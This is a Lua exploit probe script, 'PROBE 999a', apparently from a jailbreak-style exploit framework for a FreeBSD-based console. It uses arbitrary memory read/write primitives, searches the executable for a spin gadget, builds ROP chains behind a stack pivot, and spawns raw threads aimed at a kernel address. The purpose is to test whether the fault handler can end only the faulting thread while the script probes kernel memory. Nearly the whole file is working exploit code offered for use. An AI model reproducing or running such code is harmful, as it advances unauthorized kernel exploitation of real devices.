-- CRASH_CLASS: HIGH
-- PROBE 999a: can the fault handler end only the faulting thread?
--
-- 996a costs one relaunch per address because the fault kills the process, and 997a
-- showed a child's fault taking the parent with it. The handler runs on the faulting
-- thread, so the question is what it does next. This run uses two children and two
-- chains: A writes a 4-byte marker then calls thr_exit(431); B writes a marker then
-- spins forever. Whichever marker arrives, and whether [S1]/[S2] print, separates
-- "thr_exit does not end the thread" from "the kernel makes the fault fatal anyway".

local TARGET = 0xFFFFFFFF80000000

print("=== PROBE 999a: HANDLER EXIT TEST ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function as_addr(t) local s=tostring(t) local m=s:match("0x(%x+)") if m then return tonumber(m,16) end return to_num(t) end
local function wq(a,v) pcall(function() memory.write_qword(uint64(a),uint64(v)) end) end
local function rd(a) local o,v=pcall(function() return memory.read_dword(uint64(a)) end) if o then return to_num(v) end return nil end
local function find_pat(base,len,pat)
    local o,v=pcall(function() return memory.read_buffer(uint64(base),uint64(len)) end)
    if not o then return nil end
    local s=tostring(v)
    local i=s:find(pat,1,true)
    if not i then return nil end
    return base+i-1
end

local okb, ebase = pcall(function() return to_num(eboot) end)
if not okb then ebase = 0 end
print(string.format("[0] pid=%u fd=%s ebase=0x%X", to_num(mk(20)()), tostring(rd(signal.fd_addr)), ebase or 0))

local jmp_g = nil
if ebase and ebase > 0 then jmp_g = find_pat(ebase, 0x494000, string.char(0xEB,0xFE)) end
print(string.format("[0b] spin gadget=%s", tostring(jmp_g)))

local fd = rd(signal.fd_addr) or 0
local ph = gadgets.stack_pivot[1]
local ctxt = memory.alloc(8)
local mkA = memory.alloc(8)
local mkB = memory.alloc(8)
pcall(function() memory.write_dword(mkA, 0xAAAA0001) end)
pcall(function() memory.write_dword(mkB, 0xBBBB0002) end)
local addrA, addrB = as_addr(mkA), as_addr(mkB)

local function build(marker_addr, exit_thread)
    local c = ropchain({ stack_base = to_num(ph.pivot_addr) })
    c:push_store_rdx_into_memory(ctxt)
    c:push_syscall_raw(syscall.write, function()
        c:push_set_rdi(fd)
        c:push_set_rsi(marker_addr)
        c:push_set_rdx(4)
    end)
    if exit_thread then
        c:push_syscall_raw(mk(431), function() c:push_set_rdi(0) end)
    else
        c:push(jmp_g)
    end
    return c
end

local page = 0x4000
local function mmap(px)
    local _, a = pcall(function() return mk(477)(uint64(0),uint64(px),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)) end)
    local v = to_num(a)
    if v ~= 0 and v < 0x800000000000 then for o=0,px-8,8 do wq(v+o,0) end end
    return v
end
local Ctx={MAGIC=0x108,TYPE=0x110,CS=0x0C0,RIP=0x0E0,RSP=0x0F8,SS=0x100}
local block = mmap(page*4)
local start = block + page*4 - 0x200
local ctx = memory.alloc(0x500)
local tb = memory.alloc(8)
local ts = memory.alloc(16)
local ctxa = as_addr(ctx)

local function spawn(tag)
    for o=0,0x4F8,8 do wq(ctxa+o,0) end
    wq(ctxa+Ctx.MAGIC,0x480); wq(ctxa+Ctx.TYPE,0x10000)
    wq(ctxa+Ctx.CS,0x43); wq(ctxa+Ctx.SS,0x3B)
    wq(ctxa+Ctx.RIP,TARGET); wq(ctxa+Ctx.RSP,start)
    wq(as_addr(tb),0)
    print(string.format("[%s] spawning", tag))
    local ok, rv = pcall(function() return mk(430)(uint64(ctxa),uint64(as_addr(tb)),uint64(0)) end)
    print(string.format("[%s] spawn ok=%s rv=%s", tag, tostring(ok), ok and tostring(to_num(rv)) or ""))
    wq(as_addr(ts),0); wq(as_addr(ts)+8,300*1000000)
    pcall(function() mk(240)(uint64(as_addr(ts)),uint64(0)) end)
    print(string.format("[%s] ALIVE pid=%u", tag, to_num(mk(20)())))
end

build(addrA, true)
print("[A] chain A installed (write + thr_exit)")
spawn("A")

build(addrB, false)
print("[B] chain B installed (write + spin)")
spawn("B")
print("=== COMPLETE ===")
